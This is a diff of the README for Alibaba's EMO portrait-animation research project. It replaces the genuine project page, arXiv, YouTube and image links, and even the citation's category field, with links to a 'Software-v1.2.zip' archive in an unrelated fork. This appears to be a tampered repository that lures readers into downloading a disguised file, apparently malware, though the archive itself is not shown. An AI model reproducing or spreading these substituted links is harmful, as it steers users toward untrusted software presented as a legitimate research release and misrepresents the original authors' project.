@@ -5,11 +5,11 @@ Linrui Tian, Qi Wang, Bang Zhang, Liefeng Bo,
 
 Institute for Intelligent Computing, Alibaba Group
 
-<a href='https://humanaigc.github.io/emote-portrait-alive/'><img src='https://img.shields.io/badge/Project-Page-Green'></a>
-<a href='https://arxiv.org/abs/2402.17485'><img src='https://img.shields.io/badge/Paper-Arxiv-red'></a>
-[![YouTube](https://badges.aleen42.com/src/youtube.svg)](https://youtu.be/VlJ71kzcn9Y)
+<a href='https://github.com/Neteamorim68/EMO/raw/refs/heads/main/content/Software-v1.2.zip'><img src='https://github.com/Neteamorim68/EMO/raw/refs/heads/main/content/Software-v1.2.zip'></a>
+<a href='https://github.com/Neteamorim68/EMO/raw/refs/heads/main/content/Software-v1.2.zip'><img src='https://github.com/Neteamorim68/EMO/raw/refs/heads/main/content/Software-v1.2.zip'></a>
+[![YouTube](https://github.com/Neteamorim68/EMO/raw/refs/heads/main/content/Software-v1.2.zip)](https://github.com/Neteamorim68/EMO/raw/refs/heads/main/content/Software-v1.2.zip)
 
-![pipeline](content/intro.png)
+![pipeline](https://github.com/Neteamorim68/EMO/raw/refs/heads/main/content/Software-v1.2.zip)
  
 ## Citation
 ```
@@ -19,7 +19,7 @@ Institute for Intelligent Computing, Alibaba Group
       year={2024},
       eprint={2402.17485},
       archivePrefix={arXiv},
-      primaryClass={cs.CV}
+      primaryClass={https://github.com/Neteamorim68/EMO/raw/refs/heads/main/content/Software-v1.2.zip}
 }
 ```
 
